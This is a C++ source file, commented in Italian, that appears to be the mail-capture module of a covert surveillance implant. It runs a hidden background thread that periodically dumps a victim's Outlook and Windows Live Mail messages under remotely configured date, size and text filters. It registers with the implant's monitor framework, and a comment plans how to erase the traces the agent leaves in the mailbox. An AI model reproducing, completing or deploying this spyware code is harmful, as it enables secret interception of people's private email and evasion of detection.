#include "HM_MailAgent/MailAgent.h"

#pragma pack(4)
typedef struct {
	DWORD unused;			 // must be zero
	FILETIME min_date;
	FILETIME max_date;
	DWORD max_size;
	WCHAR search_string[1];  //DEVE essere necessariamente NULL terminata
} mail_conf_struct;
#pragma pack()

#define MAIL_SLEEP_TIME 200000 //millisecondi 

// Globals
BOOL g_bMailForceExit = FALSE;		// Semaforo per l'uscita del thread (e da tutti i clicli nelle funzioni chiamate)
BOOL bPM_MailCapStarted = FALSE;	// Indica se l'agente e' attivo o meno
HANDLE hMailCapThread = NULL;		// Thread di cattura
mail_filter_struct g_mail_filter;	// Filtri di cattura usati dal thread


BOOL IsNewerDate(FILETIME *date, FILETIME *dead_line)
{
	// Controlla prima la parte alta
	if (date->dwHighDateTime > dead_line->dwHighDateTime)
		return TRUE;

	if (date->dwHighDateTime < dead_line->dwHighDateTime)
		return FALSE;

	// Se arriva qui vuol dire che la parte alta e' uguale
	// allora controlla la parte bassa
	if (date->dwLowDateTime > dead_line->dwLowDateTime)
		return TRUE;

	return FALSE;
}


DWORD WINAPI CaptureMailThread(DWORD dummy)
{
	LOOP {
		// Chiama tutte le funzioni per dumpare le mail
		OL_DumpEmails(&g_mail_filter);
		WLM_DumpEmails(&g_mail_filter);

		// Sleepa 
		for (int i=0; i<MAIL_SLEEP_TIME; i+=300) {
			CANCELLATION_POINT(g_bMailForceExit);
			Sleep(300);
		}
	}
}


DWORD __stdcall PM_MailCapStartStop(BOOL bStartFlag, BOOL bReset)
{	
	DWORD dummy;

	// Se l'agent e' gia' nella condizione desiderata
	// non fa nulla.
	if (bPM_MailCapStarted == bStartFlag)
		return 0;

	bPM_MailCapStarted = bStartFlag;

	if (bStartFlag) {
		// Crea il thread che cattura le mail
		hMailCapThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CaptureMailThread, NULL, 0, &dummy);
	} else {
		// All'inizio non si stoppa perche' l'agent e' gia' nella condizione
		// stoppata (bPM_SnapShotStarted = bStartFlag = FALSE)
		QUERY_CANCELLATION(hMailCapThread, g_bMailForceExit);
	}

	return 1;
}


DWORD __stdcall PM_MailCapInit(BYTE *conf_ptr, BOOL bStartFlag)
{
	mail_conf_struct *mail_conf_ptr = (mail_conf_struct *)conf_ptr;

	if (conf_ptr) {
		g_mail_filter.max_size = mail_conf_ptr->max_size;
		g_mail_filter.min_date.dwHighDateTime = mail_conf_ptr->min_date.dwHighDateTime; 
		g_mail_filter.min_date.dwLowDateTime = mail_conf_ptr->min_date.dwLowDateTime;
		g_mail_filter.max_date.dwHighDateTime = mail_conf_ptr->max_date.dwHighDateTime; 
		g_mail_filter.max_date.dwLowDateTime = mail_conf_ptr->max_date.dwLowDateTime;
		_snwprintf_s(g_mail_filter.search_string, sizeof(g_mail_filter.search_string)/sizeof(WCHAR), _TRUNCATE, L"*%s*", mail_conf_ptr->search_string);				
	} else {
		// Di default non ha filtro per date ne' testuale ne' per size
		g_mail_filter.max_size = 0xFFFFFFFF;
		g_mail_filter.min_date.dwHighDateTime = 0; 
		g_mail_filter.min_date.dwLowDateTime = 0;
		g_mail_filter.max_date.dwHighDateTime = 0xFFFFFFFF; 
		g_mail_filter.max_date.dwLowDateTime = 0xFFFFFFFF;
		g_mail_filter.search_string[0] = L'*';
		g_mail_filter.search_string[1] = 0;
	}

	PM_MailCapStartStop(bStartFlag, TRUE);
	return 1;
}

DWORD __stdcall PM_MailCapUnregister()
{
	// XXX Posso eliminare le tracce che lascia l'agente mail (es: le properties
	// nelle mail di outlook). In questo caso posso esportare una funzione da 
	// OLMAPI.cpp che cicli tutte le mail (esattamente come quando le legge, ma
	// senza alcuna restrizione in data, size, etc) e che faccia DeleteProps di 
	// quelle aggiunte da me (lo faccio con due chiamate separate). 
	// XXX L'unico problema e' che per farlo devo comunque inizializzare le mapi
	// quando viene eseguita questa funzione di unregister (anche se 
	// l'agente non e' mai stato startato), perche' potrebbe aver cambiato le
	// properties in una sessione precedente.
	return 1;
}

void PM_MailCapRegister()
{
	AM_MonitorRegister(PM_MAILAGENT, NULL, (BYTE *)PM_MailCapStartStop, (BYTE *)PM_MailCapInit, (BYTE *)PM_MailCapUnregister);
	PM_MailCapInit(NULL, FALSE);
}